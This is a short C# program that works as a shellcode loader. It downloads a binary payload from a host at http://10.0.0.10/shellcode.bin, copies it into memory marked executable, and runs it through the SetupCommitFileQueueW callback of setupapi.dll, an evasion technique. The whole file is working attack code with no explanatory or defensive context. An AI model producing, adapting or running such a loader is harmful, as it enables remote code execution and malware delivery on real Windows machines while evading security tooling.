using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace SetupCommitFileQueueW
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string url = "http://10.0.0.10/shellcode.bin";
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);

            IntPtr addr = VirtualAlloc(IntPtr.Zero, shellcode.Length, 0x3000, 0x40);
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);

            IntPtr hQueue = SetupOpenFileQueue();

            SetupQueueCopyW(hQueue, "C:\\", "\\Windows\\System32\\", "kernel32.dll", null, null, "C:\\Windows\\Temp\\", "kernel32.dll", 0x400);

            SetupCommitFileQueueW(IntPtr.Zero, hQueue, addr, IntPtr.Zero);
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        [DllImport("setupapi.dll")]
        static extern IntPtr SetupOpenFileQueue();

        [DllImport("setupapi.dll")]
        static extern bool SetupQueueCopyW(
            IntPtr QueueHandle, 
            String SourceRootPath, 
            String SourcePath, 
            String SourceFilename, 
            String SourceDescription, 
            String SourceTagfile, 
            String TargetDirectory, 
            String TargetFileName, 
            int CopyStyle);

        [DllImport("setupapi.dll")]
        static extern bool SetupCommitFileQueueW(IntPtr Owner, IntPtr QueueHandle, IntPtr MsgHandler, IntPtr Context);
    
    }
}

